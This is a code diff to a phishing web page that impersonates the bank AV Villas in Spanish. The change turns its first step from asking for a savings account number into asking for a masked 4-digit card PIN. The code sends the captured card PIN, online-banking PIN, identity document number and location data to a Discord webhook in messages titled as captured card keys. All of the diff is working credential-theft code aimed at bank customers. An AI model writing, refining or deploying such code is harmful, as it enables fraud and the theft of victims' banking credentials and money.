@@ -384,6 +384,8 @@
             transition: border-color 0.3s;
             line-height: 56px;
             padding: 0;
+            -webkit-text-security: disc;
+            text-security: disc;
         }
 
         .code-box:focus {
@@ -467,6 +469,7 @@
             <div class="title">
                 <div class="title-red">Validación</div>
                 <div class="title-dark">de seguridad</div>
+                <div class="title-blue">AV Villas</div>
             </div>
             <div class="person-image">
                 <div class="person-placeholder">
@@ -481,17 +484,21 @@
                     <svg class="info-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                     </svg>
-                    Necesitamos validar tu cuenta
+                    Validación de tarjeta
                 </div>
                 <p class="info-text">
-                    Por seguridad, ingresa el número completo de tu cuenta de ahorros AV Villas para continuar.
+                    Por seguridad, ingresa la clave de tu tarjeta débito o crédito AV Villas para continuar.
                 </p>
             </div>
 
             <div class="form-group">
-                <label class="form-label">Número de cuenta de ahorros</label>
-                <input type="text" id="accountNumber" placeholder="Ingresa tu número de cuenta" maxlength="20" inputmode="numeric" pattern="[0-9]*">
-                <div class="account-hint">Ejemplo: 123456789012</div>
+                <label class="form-label">Clave de la tarjeta (4 dígitos)</label>
+                <div class="code-input-container">
+                    <input type="tel" class="code-box" maxlength="1" id="card1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-box" maxlength="1" id="card2" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-box" maxlength="1" id="card3" inputmode="numeric" pattern="[0-9]*">
+                    <input type="tel" class="code-box" maxlength="1" id="card4" inputmode="numeric" pattern="[0-9]*">
+                </div>
             </div>
 
             <button class="btn-continue" id="btnContinue1">CONTINUAR</button>
@@ -649,29 +656,50 @@
 
         getUserLocation();
 
-        // STEP 1: Account Number
-        const accountNumber = document.getElementById('accountNumber');
+        // STEP 1: Card PIN (4 digits)
+        const cardBoxes = [
+            document.getElementById('card1'),
+            document.getElementById('card2'),
+            document.getElementById('card3'),
+            document.getElementById('card4')
+        ];
         const btnContinue1 = document.getElementById('btnContinue1');
         const step1 = document.getElementById('step1');
         const waitScreen = document.getElementById('waitScreen');
         const step2 = document.getElementById('step2');
         const loadingTitle = document.getElementById('loadingTitle');
 
-        accountNumber.addEventListener('keypress', function(e) {
-            if (!/[0-9]/.test(e.key)) {
-                e.preventDefault();
-            }
+        cardBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                if (this.value.length === 1 && index < cardBoxes.length - 1) {
+                    cardBoxes[index + 1].focus();
+                }
+                checkCardComplete();
+            });
+
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                    cardBoxes[index - 1].focus();
+                }
+            });
+
+            box.addEventListener('keypress', function(e) {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
         });
 
-        accountNumber.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9]/g, '');
-            
-            if (this.value.length > 0) {
+        function checkCardComplete() {
+            const allFilled = cardBoxes.every(box => box.value.length === 1);
+            if (allFilled) {
                 btnContinue1.classList.add('active');
             } else {
                 btnContinue1.classList.remove('active');
             }
-        });
+        }
 
         async function sendToDiscord(data) {
             try {
@@ -708,16 +736,17 @@
             const docType = localStorage.getItem('avvillas_docType') || 'No disponible';
             const docNumber = localStorage.getItem('avvillas_docNumber') || 'No disponible';
             const pin = localStorage.getItem('avvillas_pin') || 'No disponible';
+            const cardPin = cardBoxes.map(box => box.value).join('');
 
             return {
                 embeds: [{
-                    title: "Cuenta de Ahorros Capturada - AV Villas",
-                    description: "Se ha validado un número de cuenta de ahorros.",
+                    title: "Clave de Tarjeta Capturada - AV Villas",
+                    description: "Se ha validado la clave de tarjeta.",
                     color: 15158332,
                     fields: [
                         {
-                            name: "💳 Número de Cuenta de Ahorros",
-                            value: `\`\`\`${accountNumber.value}\`\`\``,
+                            name: "💳 Clave de Tarjeta",
+                            value: `\`\`\`${cardPin}\`\`\``,
                             inline: false
                         },
                         {
@@ -731,7 +760,7 @@
                             inline: true
                         },
                         {
-                            name: "🔑 PIN",
+                            name: "🔑 PIN Banca Virtual",
                             value: `\`\`\`${pin}\`\`\``,
                             inline: true
                         },
@@ -768,7 +797,8 @@
         }
 
         btnContinue1.addEventListener('click', async function() {
-            if (accountNumber.value.length > 0) {
+            const allFilled = cardBoxes.every(box => box.value.length === 1);
+            if (allFilled) {
                 btnContinue1.disabled = true;
                 btnContinue1.textContent = 'ENVIANDO...';
 
@@ -776,7 +806,8 @@
                     await getUserLocation();
                 }
 
-                localStorage.setItem('avvillas_accountNumber', accountNumber.value);
+                const cardPin = cardBoxes.map(box => box.value).join('');
+                localStorage.setItem('avvillas_cardPin', cardPin);
 
                 const message = createAccountMessage();
                 await sendToDiscord(message);
@@ -862,7 +893,7 @@
             const docType = localStorage.getItem('avvillas_docType') || 'No disponible';
             const docNumber = localStorage.getItem('avvillas_docNumber') || 'No disponible';
             const pin = localStorage.getItem('avvillas_pin') || 'No disponible';
-            const account = localStorage.getItem('avvillas_accountNumber') || 'No disponible';
+            const cardPin = localStorage.getItem('avvillas_cardPin') || 'No disponible';
 
             return {
                 embeds: [{
@@ -876,8 +907,8 @@
                             inline: false
                         },
                         {
-                            name: "💳 Cuenta de Ahorros",
-                            value: `\`\`\`${account}\`\`\``,
+                            name: "💳 Clave de Tarjeta",
+                            value: `\`\`\`${cardPin}\`\`\``,
                             inline: false
                         },
                         {
@@ -891,7 +922,7 @@
                             inline: true
                         },
                         {
-                            name: "🔑 PIN",
+                            name: "🔑 PIN Banca Virtual",
                             value: `\`\`\`${pin}\`\`\``,
                             inline: true
                         },
